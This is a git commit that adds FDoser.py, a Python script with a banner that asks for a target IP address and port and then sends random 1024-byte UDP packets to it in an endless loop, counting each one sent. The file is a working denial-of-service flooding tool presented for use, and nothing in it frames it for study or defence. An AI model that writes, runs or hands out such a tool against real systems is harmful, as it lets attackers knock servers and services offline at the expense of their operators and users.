c950e995c86d2d433434a309e356a7080f73d62c
goldshay135 <goldshay135@gmail.com>
2020-07-05 14:46:53 +0000

    Add files via upload

---
+++ FDoser.py
@@ -0,0 +1,49 @@
+import sys
+import time
+import socket
+import random
+
+banner = (""" (     (         )   (         (     
+ )\ )  )\ )   ( /(   )\ )      )\ )  
+(()/( (()/(   )\()) (()/( (   (()/(  
+ /(_)) /(_)) ((_)\   /(_)))\   /(_)) 
+(_))_|(_))_    ((_) (_)) ((_) (_))   
+| |_   |   \  / _ \ / __|| __|| _ \  
+| __|  | |) || (_) |\__ \| _| |   /  
+|_|    |___/  \___/ |___/|___||_|_\  
+Made by goldshay135 https://github.com/goldshay135
+""")
+
+def plog(message, color):
+	if color == 0:
+		print("\033[1;32;31m" + "[*] " + message + "\033[m")
+	elif color == 1:
+		print("\033[1;32;32m" + "[*] " + message + "\033[m")
+	elif color == 2:
+		print("\033[1;32;33m" + "[*] " + message + "\033[m")
+	elif color == 3:
+		print("\033[1;32;35m" + "[*] " + message + "\033[m")
+
+if __name__ == "__main__":
+	sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+	bytes = random._urandom(1024)
+
+	print("\033[1;32;31m" + banner + "\033[m")
+
+	plog("Enter target IP:", 1)
+	ip = input()
+
+	plog("Enter target Port:", 1)
+	port = input()
+
+	sent = 0
+
+	while True:
+		try:
+			sock.sendto(bytes, (ip, int(port)))
+			sent = sent + 1
+
+			plog("Sent {} Packets".format(sent), 1)
+		except KeyboardInterrupt:
+			plog("Exiting", 0)
+			sys.exit()
